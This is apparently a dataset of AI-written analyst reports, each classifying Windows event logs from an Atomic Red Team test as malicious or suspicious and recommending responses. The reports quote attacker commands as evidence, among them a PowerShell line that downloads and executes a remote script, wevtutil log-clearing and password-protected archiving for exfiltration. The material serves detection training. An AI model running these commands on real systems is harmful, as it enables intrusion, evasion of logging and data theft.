  - Sysmon Event ID 1 shows PowerShell executable with command line arguments involving unusual scripts, such as:
    - **Example**: `powershell.exe & {cmd /c start /b psr.exe /start /output c:\temp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12 ...}`, involving screen capturing (psr.exe) and manipulation of user32.dll.

**Analysis**: The PowerShell activity capturing screen content (indicated by the usage of `psr.exe`) and DLL injection is anomalous and possibly signifies an attempt at covert data capture or other malicious operations.

### 3. **Unusual Process execution**

- **Events**: 
  - Processes such as `wevtutil.exe` being used multiple times to clear logs channels like Sysmon, Security, and Windows PowerShell.
  - Various system utilities (`taskhostw.exe, etc.`) starting up with no corresponding user activity.

**Analysis**: The use of wevtutil to clear various logs further suggests an intention to hide activities and make forensic reconstruction of events difficult.

### 4. **Elevated Privileges and Logon Events**

- **Events**:
  - Numerous logon events (Event ID 4624) with high privilege usage (Event ID 4672) by the account ""admin_test"".
  - Logon events appear legitimate but are closely tied with the log-clearing and possibly unauthorized access.

**Analysis**: The association of high privilege logons with suspicious activities indicates possible misuse of administrative credentials.

## Assessment

**Resolution: MALICIOUS**

The combination of cleared log files, the execution of suspicious PowerShell scripts, suspicious process behaviors, and high privilege usage are strong indicators of a potential compromise. The logs suggest possible exfiltration activities or preparation for further malicious acts, typically associated with an insider threat or external compromise using legitimate credentials.

## Recommended Actions

1. **Immediate Isolation**: Isolate the host (Server002) from the network to prevent further compromise or data exfiltration.
2. **Credential Audit**: Investigate the credentials of ""admin_test"" for possible compromise, and change passwords for administrative accounts.
3. **Forensic Analysis**: Carry out a detailed forensic analysis to determine the full scope and impact, including any potential backdoors or wider network access.
4. **Log Monitoring**: Enhance log monitoring and review for other systems in the network for similar patterns.
5. **User Awareness and Policies**: Reinforce security policies and conduct user training to prevent misuse or unwitting cooperation with malicious actors."
Collect Clipboard Data via VBA,"Based on the provided Windows event logs, I have conducted an in-depth analysis focusing on potential indicators of malicious activities such as suspicious process execution, uncharacteristic command-line arguments, privilege escalation events, and log clearance attempts. Below is a summary of the findings:

1. **Windows PowerShell Log:**
   - There is evidence of the following PowerShell command execution: `powershell.exe & {… IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/.../Invoke-MalDoc.ps1"" -UseBasicParsing) ...}`. 
   - This command fetches and executes a script from the internet, which is often a method utilized in malware deployment, specifically for ""fileless"" malware strategies. The URL indicates it's from a repository known for red team testing tools.

2. **Security Log:**
   - Event ID 1102 indicates that the security log was cleared by the user `admin_test`. Clearing of logs is a common technique employed by attackers to cover malicious tracks post exploitation.

3. **Sysmon Log:**
   - The presence of `wevtutil.exe cl` commands executed multiple times suggests an attempt to clear several event logs (System, Application, Security, Microsoft-Windows-Sysmon/Operational) concurrently by the same user. This reinforces the classic cleanup action after performing unauthorized activities.
   - Additionally, the `powershell.exe` command found in the Sysmon logs matches the suspicious command from the Windows PowerShell logs, implicating the execution of potential malicious scripts.

4. **System Log:**
   - Log clearance events (Event ID 104) related to the System and Windows PowerShell channels further affirm that the user account `admin_test` was involved in suspicious post-exploitation activities.

5. **General Observations:**
   - The sequence of event log clearances coincides with the execution of the PowerShell script, suggesting the script execution may have facilitated unauthorized privileged actions, including artifact cleanup.
   - The process activities and their associations (e.g., frequent use and clearance via `wevtutil.exe`) demonstrate characteristic signs of an adversary operating post-compromise.

**Assessment:**
Based on the aforementioned findings, it is evident that the activities recorded in the logs are indicative of malicious behavior, rather than benign or merely suspicious. The use of PowerShell to download and execute an external script, combined with the attempt to obscure activity by clearing event logs, is consistent with unauthorized and potentially harmful actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. First, ensure isolation of the affected machine (Server002) to prevent further potential harm.
2. Conduct a comprehensive threat containment and eradication protocol, including but not limited to:
   - Revoking access credentials for `admin_test` and any associated privileged accounts.
   - Initiating a forensic analysis to understand the full scope of compromise and any data exfiltration.
3. Consider reviewing and reinforcing security policies related to script execution and user access rights.
4. Implement enhanced monitoring and incident detection capabilities to identify similar attack vectors in the future.
5. Report and work with the IT and legal teams to address any compliance requirements or reporting obligations consequent to the findings.

These steps will aid in mitigating immediate threats and preventing recurrence of similar incidents."
Azure - Enumerate Azure Blobs with MicroBurst,"After carefully analyzing the given logs, a few points of interest are highlighted with respect to anomalous behavior indicative of potential malicious activity:

1. **Log Clearing Activities:**
   - We see multiple log-clearing activities executed by the user ""admin_test"" on `Server002`. The `wevtutil.exe` command was used to clear logs from multiple channels, including ""System"", ""Security"", and ""Windows PowerShell"". This behavior is suspicious as clearing logs can be indicative of someone attempting to cover their tracks after unauthorized actions.

2. **PowerShell Activity:**
   - In the Windows PowerShell log, a script named `Invoke-EnumerateAzureBlobs.ps1` is executed. This is potentially suspicious because the use of a script with a name aligned with known security testing frameworks (like Atomic Red Team) could indicate that either a legitimate security test is being conducted or an attacker is using known scripts to probe and exploit systems.

3. **High Privilege Activities:**
   - Several events show privilege assignments (EventID 4672) being made, typically indicating actions that might involve elevated privileges. The user `admin_test` was granted high privileges which again raises concerns if this account has been compromised or misused.

4. **Repeated Use of `SVCHOST.EXE`:**
   - There are multiple instances of various Microsoft Edge installer activities. While this may be part of legitimate update processes, it is worthwhile to verify if these actions align with scheduled updates, as installers can be used to execute arbitrary code under the guise of legitimate processes.

5. **Account Logins and Privilege Use:**
   - The logs show a network logon (Logon Type 3) using the NTLM authentication package by the user `admin_test` from the workstation `DESKTOP-3HL5B2P`. This could potentially be a legitimate remote access, but the context of other activities like log clearing makes it suspicious.

With these observations, the collective behavior of the logs reveals a pattern often associated with attempts to mask potentially unauthorized or malicious activity. 

### Final Assessment: SUSPICIOUS

While there isn't conclusive evidence directly implicating a specific malicious action (e.g., payload delivery or data exfiltration), the activities recorded (log clearing, unusual PowerShell execution, privilege assignments, and network logons) necessitate further investigation to ascertain whether these were sanctioned actions (such as part of an internal security testing like Atomic Red Team) or potentially unauthorized activities.

### Recommendations:

- Conduct an audit on the `admin_test` account usage and all activities associated with it.
- Verify if the execution of PowerShell scripts related to Atomic Red Team aligns with authorized security assessments.
- Analyze network traffic and any changes post-log clearance to identify potentially hidden malicious activity.
- Enhance monitoring on `Server002` and examine user workstation `DESKTOP-3HL5B2P` to establish links to suspicious activities.
- Review patch/update management to confirm legitimacy of Microsoft Edge installer actions."
Office365 - Email Forwarding,"The analysis of the provided logs has revealed several findings:

1. **Clearing of Event Logs:** Multiple entries indicate that event logs were cleared, specifically Event ID 1102 in the Security log and Event ID 104 in the System log. The user ""admin_test"" is implicated in these actions. Clearing event logs is a suspicious activity, often associated with an attempt to cover up tracks after unauthorized or malicious actions.

2. **Credential Access Operations:** Several Security Auditing logs (Event ID 5379) indicate attempts to access Microsoft account credentials with a return code of 3221226021, which translates to ""A device attached to the system is not functioning."" These accesses use SYSTEM privileges, and while the cause could be benign misconfiguration or system error, repeated failed credential access attempts can indicate probing for credentials by malicious actors.

3. **PowerShell Usage:** The PowerShell log contains an event where a PowerShell command is executed to connect to Exchange Online and create an inbox rule to forward emails. This particular command to automate inbox rule creation and email forwarding resembles tactics used in malicious operations, potentially associated with data exfiltration or espionage.

4. **Wevtutil Usage:** The Sysmon log indicates multiple instances of the `wevtutil.exe` utility being used to clear the different event logs (Security, System, and Application). This action matches with the previously noted log clearing events and confirms the involvement of the user ""admin_test"". `Wevtutil.exe` usage for log cleaning consolidates the suspicion of stealth attempts post-exploitation.

5. **User Privileges and System Processes:** The logs include high-privilege tokens like `SeDebugPrivilege` and `SeTcbPrivilege` being used by the SYSTEM account (Event ID 4672), which is normal for system administrative operations but noteworthy alongside the other suspicious activities.

### Assessment:
The combination of cleared logs, attempts at credential access with elevated privileges, and suspicious script usage via PowerShell presents a strong indication of malicious activity. These actions collectively suggest a compromise of the host by either an insider threat or external actor with access to administrative credentials.

### Resolution:
- **MALICIOUS** - The logs contain clear evidence of malicious activity, with actions that can disrupt forensic investigations (e.g., log clearing) and operations resembling typical post-exploitation activities.

### Guidance on Next Steps:
1. **Incident Response Activation**: Initiate a full incident response process, involving forensic analysis and containment of affected systems.
   
2. **User Account Auditing**: Immediately audit the ""admin_test"" account usage across other systems to identify any broader compromise or unauthorized access.

3. **Log Recovery & Preservation**: Attempt to recover the cleared log data using potential backup or shadow copies and ensure current logs are preserved for investigation.
   
4. **Network Monitoring and Mitigation**: Implement heightened network monitoring, focusing on unusual traffic patterns and outbound connections, especially those associated with email forwarding rules.

5. **Credential Changes**: Reset and scrutinize any credentials that might have been compromised, specifically targeting admin accounts and any accounts connected to sensitive services like Exchange Online.

6. **Communications**: Notify relevant stakeholders and prepare communications for any partners or clients affected by potential data exfiltration or access.
  
By following these steps, the organization will be better positioned to address the immediate threat and mitigate further risk."
Email Collection with PowerShell Get-Inbox,"Upon analyzing the provided Windows event logs, several suspicious activities and potential indicators of compromise have been identified. Below is a detailed analysis of the logs:

1. **Use of PowerShell with Execution Policy Bypass**:
   - Multiple instances of PowerShell were executed with `-executionpolicy bypass`, which is often used to bypass PowerShell's default security settings. This is a common technique used by attackers to execute scripts without any restriction.
   - The command executed involves `Get-Inbox.ps1` from `AtomicRedTeam`, which is a known open-source testing framework for simulating cyber attacks. It indicates the testing of attack techniques related to email inbox access. This tool is typically used by red teams or penetration testers to simulate attacks, but its presence on a production server could indicate unauthorized or malicious activity.

2. **Clearing of Event Logs**:
   - Several event logs, including security and system logs, were cleared by the user `admin_test`. Events 1102 in the Security log and 104 in the System log clearly indicate the clearing of logs, which is a tactic attackers use to cover their tracks and remove evidence of their activities.

3. **Wevtutil.exe Usage**:
   - Wevtutil.exe was used to clear logs, which is consistent with the behavior of malicious actors attempting to delete traces by manipulating event logs. This is confirmed by the corresponding Sysmon and Security events indicating log clearance.

4. **Unusual Scheduled Executions**:
   - The frequent invocations of processes related to Microsoft Edge updates may appear innocuous, as they could be routine system updates. However, given the context of other suspicious activities, it’s important to verify the legitimacy of these actions, particularly if the timing does not align with typical update schedules or if they occur immediately after potentially malicious activities.

5. **Logon and User Information**:
   - All suspicious activities, including PowerShell executions and log clear, are executed under the user account `SERVER002\admin_test`, suggesting either a compromised account or misuse by an insider.

**Assessment:**

- The combination of PowerShell execution with policy bypass, clearing of critical logs, and the potentially unsanctioned use of Atomic Red Team scripts strongly suggests malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:

1. **Immediate Incident Response**:
   - Isolate the affected server (Server002) from the network to prevent any further potential compromise.
   - Conduct a full investigation on the server to determine the extent of the compromise and ensure no backdoors or persistent threats remain.

2. **User Account Verification**:
   - Verify the activities and access permissions of `admin_test`. If unauthorized activities are confirmed, change all associated credentials and force logout from all sessions.

3. **Log Analysis and Monitoring**:
   - Retrieve and analyze log backups if available, as current logs have been cleared.
   - Implement stricter monitoring controls, specifically focusing on administrative accounts and tools like PowerShell and Wevtutil.

4. **Review and Harden Security Policies**:
   - Enforce stricter PowerShell execution policies and disable or restrict unnecessary administrative access to execution policy bypass.
   - Regularly back up logs and implement mechanisms to prevent unauthorized log clearance.

5. **Enhance Security Training**:
   - Conduct security awareness training to ensure users, especially those with administrative privileges, are aware of potential threats and the importance of adhering to security protocols.

These steps will help contain the threat, prevent further damage, and fortify defenses against future incidents."
Windows Screen Capture (CopyFromScreen),"Upon analyzing the provided Windows event logs, several indicators suggest suspicious or possibly malicious activity occurring on ""Server002"". Below is a detailed analysis of findings:

### Key Findings:

1. **PowerShell Activity:**
   - The logs indicate multiple PowerShell executions that appear highly suspicious:
     - A script execution involving a PowerShell command with `Add-Type -AssemblyName System.Windows.Forms` and capturing the screen (`CopyFromScreen`), then saving it to a file `T1113.png` in the temp directory. This activity aligns with the MITRE ATT&CK technique T1113 (Screen Capture), which is often used for credential harvesting or reconnaissance purposes by malicious actors.

2. **Security Log:**
   - Event ID 1102 is noted in the security log, which indicates the audit log has been cleared. This is typically a red flag as adversaries often clear event logs to cover their tracks post-compromise.
   - The user 'admin_test' was the subject name, showing likely usage of an admin account to clear the logs.

3. **Sysmon Log:**
   - Numerous entries show usage of the `wevtutil.exe` utility by 'admin_test' to clear logs from multiple event channels (such as Sysmon/Operational, Security, Application, etc.). Clearing logs is often considered a malicious activity aimed to remove traces.
   - The process and command lines shown (`wevtutil.exe` cl Security, Application, System) affirm log deletion attempts by 'admin_test'.

4. **Persistence and Reconnaissance Indicators:**
   - Execution of system utilities like `whoami.exe` and `hostname.exe` suggests potential reconnaissance efforts to understand the system environment.
   - High integrity levels associated with these processes confirm administrative privilege usage.

5. **Time Change Events:**
   - System time updates through `svchost.exe` without apparent legitimate reason can sometimes be a tactic to manipulate timestamps or bypass certain controls, although not definitive in isolation.

### Assessment:
The combination of:
- Screen capture script execution via PowerShell.
- Log clearing activities.
- Administrative level system reconnaissance.

These factors collectively point towards a compromise of the system, potentially via a high-privileged account or process escalation.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
- **Immediate Action:**
  - Disconnect the implicated server (Server002) from the network to prevent potential lateral movement or data exfiltration.
  
- **Forensic Analysis:**
  - Perform A full forensic investigation on the server to identify the initial entry point and scope of compromise.
  - Analyze other potential lateral movements within the network.

- **Log Reviews & Monitoring:**
  - Increase logging and monitoring across other servers especially focusing on administrative actions and suspicious PowerShell activities.
  
- **Improvement in Security Posture:**
  - Review and enhance PowerShell logging and script-blocking policies.
  - Implement stricter access-control and audit-log review processes.
  - Consider deployment of endpoint detection and response (EDR) solutions for real-time threat monitoring.

This analysis suggests immediate attention to prevent further damage and ensure system security integrity."
Automated Collection PowerShell,"After reviewing the provided logs, several key events stand out that suggest potentially suspicious activity:

1. **Process Execution and Command Line Usage**: The Powershell script observed appears to be collecting `.doc` files from the system and copying them to a temporary directory (`T1119_powershell_collection`). This behavior aligns with data exfiltration or unauthorized data collection activities, which are considered suspicious especially if such operations were not explicitly authorized or scheduled.

2. **Log File Clearance**: The Security and System logs indicate that log files have been cleared around the same timestamp (`EventID: 1102` and `EventID: 104`). The user `admin_test` was responsible for these actions. Clearing event logs can be indicative of an attempt to cover tracks following unauthorized access or malicious activities.

3. **Frequent Use of System Utilities**: The repeated execution of utilities like `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and processes related to Edge Update seem excessive over a short time span. While individually they may not be inherently malicious, the frequency and conjunction with log clearing and Powershell script execution are unusual and may suggest evasion or persistence techniques.

4. **Process Integrity Levels**: Notably, many of the processes executed have high integrity levels. This could indicate privileged operations that can be leveraged for malicious purposes if not properly secured or monitored.

**Assessment**: The combination of the log-clearing events, data collection via Powershell, and excessive system utility calls is suspicious and merits further investigation. It raises concern about the possibility of malicious intent, such as data exfiltration and log manipulation to avoid detection.

**Resolution**: **SUSPICIOUS** - These logs contain activity that suggests potential compromise. Further detailed investigation should be conducted to determine the nature and extent of any unauthorized access or malicious action. This should include:
- Verifying the legitimacy of the Powershell script and the purpose behind it.
- Auditing user `admin_test` activities for any unauthorized access or privilege escalations.
- Reviewing network activity logs for any anomalous data transfers or communications.
- Implementing enhanced monitoring to detect similar patterns in real-time.
- Notify the security team for a more in-depth analysis and to ensure relevant countermeasures are in place."
Stage data from Discovery.bat,"Upon reviewing the provided logs, I have identified several indications of suspicious and potentially malicious behavior:

1. **Log File Clearing**: The System log contains multiple Event ID 104 entries indicating that the logs, including System, Windows PowerShell, and Security logs, were cleared by a user named ""admin_test"". This is often an attempt to cover tracks after executing potentially malicious or unauthorized activities.

2. **Suspicious PowerShell Activity**: The Windows PowerShell log shows the execution of a command using `Invoke-WebRequest` to download a batch file from a known red teaming repository (Atomic Red Team). The command is executed via PowerShell and targets a remote URL, which is suspicious as it is commonly associated with testing or malicious activities.

3. **Sysmon and Security Log Correlation**: The Sysmon logs show the execution of `wevtutil.exe` to clear event logs, an action taken immediately before the log files in the System log were cleared. This correlates directly with the suspicious log-clearing activities identified.

4. **Potential Misuse of Privileges**: The Security log shows Event ID 4672, indicating that the user ""admin_test"" had privileges like `SeSecurityPrivilege`, `SeDebugPrivilege`, and others associated with administrative rights, which could allow significant control over the system.

5. **Host and User Identification Commands**: Commands such as `hostname.exe` and `whoami.exe` were executed, which could indicate an attempt to gather system and user information—common steps in the enumeration phase of an attack.

Based on these observations, the activities detailed in the logs appear coordinated and contain several indicators of possible malicious intent, especially the clearing of logs and the use of PowerShell to reach out to an external source.

**Final Assessment: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host to prevent any further potential spread of unauthorized activities.
- Conduct a thorough investigation and forensic analysis of the host, focusing on file changes and user activity around the timestamps of these logs.
- Review user account activities, especially around the ""admin_test"" user, for any anomalies or unauthorized actions.
- Implement and enhance alerting and logging for similar PowerShell activities and log file clearance in the future.
- Consider conducting a full network threat hunting to identify if any other systems show similar signs of compromise.
- Engage with incident response if further signs of compromise or unauthorized actions are detected beyond this host."
Compress Data and lock with password for Exfiltration with winrar,"Upon thorough analysis of the provided logs, several activities appear suspicious and warrant further investigation. Here’s a detailed breakdown of these findings:

1. **Log Clearing Activity**: 
   - The System log shows multiple entries with EventID 104 indicating that the event log has been cleared. This was performed by the user ""admin_test"" on channels ""System"" and ""Windows PowerShell.""
   - The Security log also shows EventID 1102, indicating the Security log was cleared by the ""admin_test"" user.
   - Clearing of logs is a common technique used by malicious actors to cover their tracks and should always be considered suspicious without proper justification.

2. **Execution of Command-Line Utilities**:
   - Sysmon logs reveal multiple executions of the `cmd.exe` with suspicious command lines under the user context ""SERVER002\admin_test."" For instance:
     - `""cmd.exe"" /c mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar & dir`
     - This command line, indicating an attempt to create files and archives with password protection, is highly suspect and suggestive of potential ransomware or data exfiltration activities.
   - The usage of `wevtutil.exe` to clear event logs further supports malicious intent as seen in entries clearing ""Sysmon/Operational,"" ""Application,"" and ""System"" logs.

3. **Use of Powerful Privileges**:
   - EventID 4672 from the Security log lists special privileges being assigned to the SYSTEM account, including `SeDebugPrivilege` and `SeBackupPrivilege`. While SYSTEM typically has elevated privileges, the lack of context or corresponding legitimate operations raises suspicion, especially in conjunction with log clearing and file operations.

4. **Suspicious Integrity Level**:
   - Processes executed under a ""High"" integrity level by ""admin_test"" further underscore the need for scrutiny, particularly regarding the command-line activities that point to potentially unauthorized file operations.

5. **Microsoft Edge Update Activities**:
   - Numerous instances of Microsoft Edge Update processes are observed. While these can normally be benign, the context of this activity (along with the other suspicious behaviors occurring around the same time) merits validation to ensure updates are legitimate.

**Assessment and Guidance**:
Given the findings, the log entries exhibit a pattern of activities consistent with an attempt to hide potentially unauthorized or malicious operations:
- Log clearing events
- Suspicious command line executions potentially related to ransomware/data encryption
- Elevated privileges
- Activities aligned with log and evidence removal tactics

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Conduct a thorough investigation to determine motive and scope. Check for unauthorized access or signs of a data breach incident.
- Immediate steps should include isolating the affected host for detailed forensic analysis to prevent further potential compromise.
- Review any recent changes in permissions or group policies associated with the ""admin_test"" account and others to prevent unauthorized privileged access.
- Validate the Microsoft Edge updates to ensure they originate from legitimate sources.
- Combine local analysis with network monitoring for any signs of external communications or data exfiltration.
- Ensure comprehensive logging and continuous monitoring post-incident to detect recurrence or further activities."
using device audio capture commandlet,"After thoroughly analyzing the provided Windows event logs, several aspects stand out that suggest potentially suspicious activity:

1. **Event Log Clearing:**
   - Multiple Windows Event Logs, including System, Windows PowerShell, and Security logs, have been cleared by a user with the username ""admin_test"" on the computer ""Server002"". This is often a tactic used by malicious actors to cover their tracks and can be a significant red flag. 
   - System Log EventID 104, Security Log EventID 1102, and associated Sysmon logs indicate the logs clearing were executed using `wevtutil.exe`, a console utility for event log management.

2. **PowerShell Activity:**
   - The logs show the execution of PowerShell commands: 
     - PowerShell instances are launched with the command `powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet`. This command seems unusual and worth investigating further, as PowerShell is frequently used in attacks for malicious scripting. The references to `WindowsAudioDevice-Powershell-Cmdlet` should be researched to determine if these are legitimate or potentially harmful scripts.
   - Sysmon logs captured these PowerShell execution events (event records 17961, 17962, and 17963).

3. **High Integrity Level Processes:**
   - The integrity level of the processes run by ""admin_test"" is marked as ""High."" This suggests that the scripts and commands were executed with elevated privileges, potentially allowing for significant system changes.

4. **Time Manipulation:**
   - There are events (Security Event ID 4616) that log a change in system time handled by svchost.exe. While this could be routine system behavior, time changes can also be employed to confuse log timeline tracking.

In summary, the clearing of various event logs, suspicious PowerShell command execution, and time changes suggest potentially unauthorized or malicious activity. The clearing of logs without a known or documented legitimate reason is particularly concerning.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a deeper investigation into the context and origin of the PowerShell commands and scripts executed.
- Verify the legitimacy of the user ""admin_test"" and ensure that both the clearing of logs and PowerShell command execution were authorized and necessary.
- Implement additional monitoring for ""Server002"" to detect any further indicators of compromise.
- Consider employing security solutions to monitor and alert on log clearance activities and PowerShell execution.
- Review the change management logs or approvals that may explain the time changes and ensure this aligns with system management practices."
Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted,"Based on the detailed analysis of the provided logs, the following observations can be made:

### Suspicious Findings:

1. **Windows PowerShell Log**:
   - The PowerShell logs show a sequence of commands that interact with the Windows Registry, specifically adding and deleting a registry key: `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI`.
   - The command appears to modify a registry setting related to AI data analysis, which could potentially be used for persistence or disabling certain features.

2. **Security Log**:
   - Event ID 1102 indicates the security event log was cleared by a user named `admin_test`. This is a significant red flag, as clearing event logs can be an attempt to cover tracks after performing malicious activities.
   
3. **Sysmon Log**:
   - The use of `wevtutil.exe` to clear event logs, including the System and Security channels, was recorded. This is consistent with attempts to obfuscate or hide malicious activity.
   - There is a notable number of `conhost.exe` processes being instantiated with command lines like `0xffffffff -ForceV1`, which can be indicative of attempts to obfuscate command execution related to malicious behavior.

4. **System Log**:
   - System event logs were also cleared, which aligns with the behavior observed in the security logs and Sysmon events, indicating an attempt to hide activities.
   
### Conclusion:

- The actions observed, such as clearing event logs and registry modifications via PowerShell, suggest potentially malicious behavior. Clearing logs is highly indicative of an attempt to cover up unauthorized or malicious actions.
- The PowerShell execution modifying registry keys combined with log clearance points towards a potentially compromised system or malicious operation.

### Resolution:

- **MALICIOUS** - The activities logged, including the clearing of security and system logs, are strong indicators of malicious behavior. The use of PowerShell to manipulate registry keys further supports this conclusion.

### Guidance:

- Immediate action is recommended to isolate the host `Server002` to prevent further potential spread or damage.
- Conduct a forensic analysis to understand the full scope of the activity, including reviewing any changes made by the registry edits.
- Reset credentials for users who had access at the time, especially `admin_test`, and consider additional monitoring for lateral movements.
- Implement audits and reviews of logging configurations to prevent tampering in the future.
- Determine the source of the compromise and apply patches or updates as necessary to prevent recurrence."
Zip a Folder with PowerShell for Staging in Temp,"Here's a detailed analysis of the logs provided:

**PowerShell Log Analysis:**

- The PowerShell events indicate usage of the `Compress-Archive` cmdlet to zip a directory labeled as part of ""AtomicRedTeam"" artifacts. `Atomic Red Team` is a project that provides documentation of tests for detecting adversarial tactics, techniques, and procedures (TTPs) according to the MITRE ATT&CK framework. While this context suggests potential benign activity as part of security testing, it’s essential to verify with the operations or red teaming department if they scheduled such a test.

**Sysmon Log Analysis:**

- Multiple entries of `wevtutil.exe` (Eventing Command Line Utility) and `conhost.exe` are observed, showing attempts to clear event logs (`cl`) for the Application, System, and Security channels. Clearing event logs is often a technique used by attackers to cover their tracks.
- The logs also show `whoami.exe` and `hostname.exe`, which could indicate reconnaissance activity, but can be benign depending on the context.
- The Process Creation events and the involvement of `wevtutil.exe` to clear logs suggest potential malicious activity if it is unauthorized.

**System, Application, and Security Log Analysis:**

- Events with ID 104 in the System log indicate that the event logs were cleared by user `admin_test`, notably without backing up the logs. This aligns with the Sysmon logs and implies an effort to delete forensic evidence, which is a malicious behavior unless part of an authorized operation.
- The time service logs show the system time being adjusted backwards. Manipulating system time can potentially be utilized by an attacker to manipulate timestamps in logs, potentially to confuse or thwart investigations.

**Threat Assessment:**

- **Clearing of Logs:** The act of clearing event logs, particularly security logs, without backup is a clear indicator of malicious activity.
- **Time Manipulation:** The adjustment of system time backward aligns with attempts to obscure actions or confuse event sequences.

**Resolution: MALICIOUS**

The activities recorded in the logs, such as clearing event logs without backup and possible time tampering, strongly indicate malicious actions. Immediate steps should include:

1. **Verify with teams (e.g., Red Team) if these actions were part of sanctioned activity.**
2. **Conduct a deeper forensic investigation:** 
   - Check for known indicators of compromise (IOCs) associated with this behavior.
   - Analyze other hosts in the network for similar activity.
3. **Containment and Remediation:**
   - Isolate the compromised systems from the network.
   - Patch systems, update credentials, and strengthen monitoring capabilities.
4. **Review security policies:** Ensure logging policies disallow the clearing of logs without review/backup and ensure administrators are aware of these protocols."
Registry artefact when application use webcam,"Upon reviewing the provided Windows event logs, several events and potential indicators of malicious activity stand out.

1. **Security Log - Event ID 1102 (Log Cleared):**
   - The security log indicates that the logs were cleared by the user ""admin_test"" on ""Server002."" This event can be suspicious as log clearing could be an attempt to hide malicious activities. Log clearing is often associated with efforts to cover tracks post-compromise.

2. **Sysmon Logs - Multiple Usage of `wevtutil.exe`:**
   - There are several executions of `wevtutil.exe` with the command to clear various logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, `Windows PowerShell`). Clearing these logs without a clear administrative reason is suspicious, as it often indicates an attempt to remove evidence of potentially malicious activity.

3. **Sysmon Logs - Unusual Registry Modifications via `cmd.exe` and `reg.exe`:**
   - A concerning command involves using `cmd.exe` to run a `reg.exe` operation that adds registry keys related to `webcam` capabilities. This is highly suspicious behavior indicating potential registry tampering, possibly related to privacy invasion or unauthorized surveillance attempts via the webcam.

4. **Process Execution:**
   - There are benign executions of common system utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe`, which do not inherently suggest malicious activity.

5. **Edge Update (Microsoft-Edge):**
   - Several events related to Microsoft Edge update processes are present. These processes, under normal circumstances, appear to be legitimate system and application updates. However, without further context, these activities should be reviewed as routine unless suspicious binaries and unexpected command-line parameters are observed.

### Assessment:
The presence of logs being cleared, particularly security logs, coupled with execution of `wevtutil.exe` to remove other log entries, suggests possible malicious intent to hide activities on the system. The registry modifications related to webcam settings executed via command line also adds to the suspicion level.

### Resolution:
- **SUSPICIOUS:** The logs contain activity indicative of potentially unauthorized actions within the system. There is a likelihood of compromise that warrants a deeper investigation.

### Guidance:
- Initiate a thorough incident response investigation to determine the full scope and impact of the suspicious activities.
- Analyze why logs were cleared and registry settings were modified, especially in relation to webcam usage.
- Review and secure user accounts, especially ""admin_test,"" to ensure they are not being misused.
- Conduct a full audit of the system for additional indicators of compromise and take remedial actions as necessary.
- Implement additional logging and monitoring processes to prevent future log clearing without detection and ensure all activities are accounted for."
Azure - Scan for Anonymous Access to Azure Storage (Powershell),"Upon a detailed analysis of the provided log entries, I have identified several events that suggest potentially suspicious behavior. Here is the assessment:

1. **Log Clearing Activity:**
   - The logs show a sequence of `wevtutil.exe` commands for clearing logs. Specifically, the logs for security, system, and Windows PowerShell were cleared, as indicated by the presence of `EventID: 104` from the System log and `EventID: 1102` from the Security log. This action is performed by the user `admin_test`.
   - Clearing event logs like this is often a tactic used by malicious actors to cover their tracks after illicit activities.

2. **PowerShell Activity:**
   - A suspicious PowerShell command was executed as shown in the Windows PowerShell log. The command attempts to perform a web request to an external URL (`https://T1530Test2.blob.core.windows.net/`) and handles exceptions related to anonymous access. This command can be indicative of data exfiltration attempts or communications with a suspicious external server.
   - The use of PowerShell to interact with remote servers can be characteristic of malware trying to communicate with control servers.

3. **Process Execution:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` processes are invoked, often associated with high integrity levels and initiated by a specific user (`admin_test`). While the `conhost.exe` can appear legitimate, its frequent relation to `wevtutil.exe` clearing events raises concern.
   - The presence of `whoami.exe` and `hostname.exe` logs may indicate attempts to gather information about the current user context and system environment.

4. **Edge Update:**
   - The logs show routine behaviors related to Microsoft Edge updating processes. However, without additional support, this does not immediately raise red flags compared to the more suspicious actions previously identified.

**Assessment and Guidance:**

- **Resolution:** **MALICIOUS**

The combination of event log clearing, suspicious PowerShell command execution, and unauthorized process activity strongly indicates malicious activity. These activities align with common tactics used in post-exploitation phases of an attack, wherein attackers may exfiltrate data using PowerShell and attempt to erase evidence by clearing logs.

**Guidance:**

- **Immediate Action:**
  - Investigate the user account `admin_test` for unauthorized access or potential compromise.
  - Check for any inconsistencies or unfamiliar IP addresses accessing `Server002`.
  - Isolate `Server002` from the network to prevent further potential data exfiltration.

- **Further Analysis:**
  - Conduct a deep-dive forensic analysis on `Server002` to identify any malware or unauthorized tools.
  - Review firewall and proxy logs for outbound connections to suspicious external URLs.
  
- **Preventive Measures:**
  - Strengthen audit policies for user actions and process creations.
  - Increase the frequency of reviewing security logs and set alerts for unusual events like log clearing.
  - Implement more restrictive PowerShell execution policies and logging."
Automated Collection Command Prompt,"Upon analyzing the provided Windows event logs, several activities stand out that warrant a closer examination for potential indicators of malicious activity.

1. **Event Log Clearing**:
   - The logs indicate multiple instances of logs being cleared by the user ""admin_test"". Specific System and Security event log clearing activities are captured with `EventID 104` in the System log and `EventID 1102` in the Security log. This is a significant indicator of potential malicious behavior, as adversaries often clear logs to cover their tracks after compromising a system.

2. **Suspicious Processes**:
   - **`wevtutil.exe` Execution**: Multiple entries in the Sysmon log reveal that the `wevtutil.exe` process was executed by ""admin_test"" to clear different event logs, such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Security"". The usage of `wevtutil` for clearing logs is suspicious, especially in conjunction with the cleared log events.
